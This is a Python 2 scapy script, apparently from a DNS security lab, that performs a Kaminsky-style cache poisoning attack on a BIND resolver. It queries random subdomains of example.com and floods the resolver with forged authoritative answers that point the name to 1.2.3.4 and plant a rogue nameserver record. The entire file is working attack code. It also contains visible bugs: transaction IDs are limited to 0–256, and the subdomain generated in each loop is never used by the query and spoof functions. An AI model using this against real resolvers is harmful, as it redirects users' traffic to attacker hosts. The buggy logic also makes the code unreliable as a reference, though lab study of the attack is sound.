#!/usr/bin/env python2
import argparse
import socket

from scapy.all import *
from random import randint, choice
from string import ascii_lowercase, digits
from subprocess import call


parser = argparse.ArgumentParser()
parser.add_argument("--ip", help="ip address for your bind - do not use localhost", type=str, required=True)
parser.add_argument("--port", help="port for your bind - listen-on port parameter in named.conf", type=int, required=True)
parser.add_argument("--query_port", help="port from where your bind sends DNS queries - query-source port parameter in named.conf", type=int, required=True)
args = parser.parse_args()

# your bind's ip address
my_ip = args.ip
# your bind's port (DNS queries are send to this port)
my_port = args.port
# BIND's port
# dns_port = args.dns_port
# port that your bind uses to send its DNS queries
my_query_port = args.query_port

# additional parameters.
domain_name = "example.com"
addr_to_spoof = '1.2.3.4'
NS = 'ns.dnslabattacker.net'

'''
Generates random strings of length 10.
'''
def getRandomSubDomain():
	return ''.join(choice(ascii_lowercase + digits) for _ in range (10))

'''
Generates random 8-bit integer.
'''
def getRandomTXID():
	return randint(0, 256)

'''
Sends a UDP packet.
'''
def sendPacket(sock, packet, ip, port):
    sock.sendto(str(packet), (ip, port))

'''
Example code that sends a DNS query using scapy.
'''
def exampleSendDNSQuery():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    dnsPacket = DNS(rd=1, qd=DNSQR(qname='example.com'))
    sendPacket(sock, dnsPacket, my_ip, my_port)
    response = sock.recv(4096)
    response = DNS(response)
    print "\n***** Packet Received from Remote Server *****"
    print response.show()
    print "***** End of Remote Server Packet *****\n"

subdom= getRandomSubDomain() + '.' + domain_name
def mySendDNSQuery():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    dnsPacket = DNS(rd=1, qd=DNSQR(qname=subdom))
    sendPacket(sock, dnsPacket, my_ip, my_port)

    return sock

def dnsSpoofer():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    dns = DNS(
            id = getRandomTXID(),
            aa = 1,
            rd = 0,
            qr = 1,
            qdcount = 1,
            ancount = 1,
            nscount = 2,
            arcount = 0,
            qd = DNSQR(qname=subdom),
            an = DNSRR(rrname=subdom, type='A', rdata=addr_to_spoof, ttl=68900),
            ns = DNSRR(rrname=b'example.com', type='NS', rdata=NS)
            )
   
    resp = dns
    resp.getlayer(DNS).qd.qname = subdom

    for r in range(125):
        resp.getlayer(DNS).id = getRandomTXID()
        sendPacket(sock, resp, my_ip, my_query_port)

    sock.close()
    return

def kaminskyAttack():
    while 1:
        subdom = getRandomSubDomain() + '.' + domain_name
        sock = mySendDNSQuery()
        dnsSpoofer()
        data, _ = sock.recvfrom(4096)
        resp = DNS(data)
        #4096, ttl 68900
        if resp[DNS].an and resp[DNS].an.rdata == addr_to_spoof:
            print("kaminsky success")
            sock.close()
            break


if __name__ == '__main__':
    kaminskyAttack()
